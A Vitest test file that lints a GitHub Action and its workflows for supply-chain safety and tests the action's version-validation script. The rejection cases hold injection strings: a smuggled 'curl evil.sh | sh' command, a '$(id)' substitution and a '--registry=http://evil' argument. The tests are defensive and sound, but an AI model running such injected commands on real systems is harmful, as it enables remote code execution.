import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { parse } from 'yaml';

// Supply-chain lint for the composite Action users adopt and our own CI.
const repoRoot = path.join(import.meta.dirname, '..', '..', '..');
const workflowDir = path.join(repoRoot, '.github', 'workflows');
const workflows = fs
  .readdirSync(workflowDir)
  .filter((f) => /\.ya?ml$/.test(f))
  .map((f) => path.join('.github', 'workflows', f));
const files = ['action.yml', ...workflows];

interface Step {
  id?: string;
  uses?: string;
  run?: string;
}

const load = (file: string) => parse(fs.readFileSync(path.join(repoRoot, file), 'utf8'));

function stepsOf(file: string): Step[] {
  const doc = load(file);
  if (file === 'action.yml') return doc.runs.steps;
  return Object.values(doc.jobs as Record<string, { steps?: Step[] }>).flatMap((job) => job.steps ?? []);
}

describe('workflows and action.yml', () => {
  it.each(files)('%s pins third-party actions by commit SHA', (file) => {
    const unpinned = stepsOf(file)
      .map((s) => s.uses)
      .filter((u): u is string => typeof u === 'string' && !u.startsWith('./'))
      .filter((u) => !/@[0-9a-f]{40}$/.test(u));
    expect(unpinned, `${file}: ${unpinned.join(', ')}`).toEqual([]);
  });

  it.each(files)('%s never interpolates GitHub expressions into a shell script', (file) => {
    const interpolated = stepsOf(file).filter((s) => s.run?.includes('${{'));
    expect(interpolated.map((s) => s.run)).toEqual([]);
  });

  it.each(workflows)('%s declares top-level permissions', (file) => {
    expect(load(file).permissions, file).toBeDefined();
  });
});

const hasBash = spawnSync('bash', ['-c', 'exit 0']).status === 0;

describe.skipIf(!hasBash)('action.yml version validation', () => {
  const script = stepsOf('action.yml').find((s) => s.id === 'validate')?.run ?? '';
  const validate = (version: string) =>
    spawnSync('bash', ['-c', script], { env: { ...process.env, STUDIO_VERSION: version }, encoding: 'utf8' });

  it.each(['latest', 'next', '0.3.1', '^0.3.0', '~1.2', '1.0.0-beta.2'])('accepts %s', (version) => {
    expect(validate(version).status).toBe(0);
  });

  it.each(['latest; curl evil.sh | sh', '$(id)', '1.0.0 --registry=http://evil', ''])('rejects %j', (version) => {
    const result = validate(version);
    expect(result.status).not.toBe(0);
    expect(result.stderr).toContain('invalid version');
  });
});

describe('release.yml', () => {
  const steps = stepsOf('.github/workflows/release.yml') as (Step & { if?: string; name?: string })[];
  const publishAt = steps.findIndex((s) => s.uses?.startsWith('changesets/action@'));

  it.each(['pnpm lint', 'pnpm typecheck', 'pnpm test', 'pnpm smoke:pack'])('runs `%s` before publishing', (cmd) => {
    const at = steps.findIndex((s) => s.run?.split('\n').some((line) => line.trim() === cmd));
    expect(at, `${cmd} missing`).toBeGreaterThanOrEqual(0);
    expect(at).toBeLessThan(publishAt);
  });

  it('moves the major tag only after a publish', () => {
    expect(steps[publishAt]?.id).toBe('changesets');
    const tag = steps.slice(publishAt + 1).find((s) => s.run?.includes('git tag -f'));
    expect(tag?.if).toBe("steps.changesets.outputs.published == 'true'");
    expect(tag?.run).toContain('git push -f origin');
  });
});

describe('issue forms', () => {
  const dir = path.join(repoRoot, '.github', 'ISSUE_TEMPLATE');
  it.each(fs.readdirSync(dir))('%s parses', (file) => {
    const doc = parse(fs.readFileSync(path.join(dir, file), 'utf8'));
    if (file !== 'config.yml') expect(doc.body.length).toBeGreaterThan(0);
  });
});

describe('changesets action matches the changesets CLI', () => {
  it('uses action v1 with CLI 2.x and action v2 with CLI 3.x', () => {
    const cli = JSON.parse(fs.readFileSync(path.join(repoRoot, 'package.json'), 'utf8')).devDependencies[
      '@changesets/cli'
    ] as string;
    const cliMajor = Number(cli.match(/\d+/)?.[0]);
    const release = fs.readFileSync(path.join(repoRoot, '.github', 'workflows', 'release.yml'), 'utf8');
    const actionMajor = Number(release.match(/changesets\/action@[0-9a-f]{40} # v(\d+)/)?.[1]);
    expect({ cliMajor, actionMajor }).toEqual({ cliMajor, actionMajor: cliMajor - 1 });
  });
});
